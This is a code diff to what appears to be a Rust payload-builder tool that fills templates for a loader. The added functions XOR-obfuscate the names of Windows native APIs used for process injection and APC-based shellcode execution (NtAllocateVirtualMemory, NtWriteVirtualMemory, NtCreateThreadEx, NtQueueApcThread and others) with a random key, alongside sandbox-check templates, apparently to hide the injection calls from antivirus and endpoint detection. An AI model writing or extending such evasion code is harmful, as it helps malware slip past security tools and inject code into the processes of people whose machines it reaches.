@@ -14,6 +14,20 @@ use std::path::{Path, PathBuf};
 use std::process::exit;
 use std::time::{SystemTime, UNIX_EPOCH};
 
+fn obfuscate_api_name(name: &str, key: u8) -> String {
+    let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
+    format!("[{}]", bytes.join(", "))
+}
+
+fn non_zero_random_key() -> u8 {
+    loop {
+        let k = random_u8();
+        if k != 0 {
+            return k;
+        }
+    }
+}
+
 const OUTPUT_DIR: &str = "shared";
 
 fn search_and_replace(
@@ -123,6 +137,16 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
         replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
         replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
     }
+
+    let api_key = non_zero_random_key();
+    replacements.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
+    replacements.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", api_key));
+    replacements.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", api_key));
+    replacements.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", api_key));
+    replacements.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", api_key));
+    replacements.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", api_key));
+    replacements.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", api_key));
+    replacements.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", api_key));
 
     replacements
 }
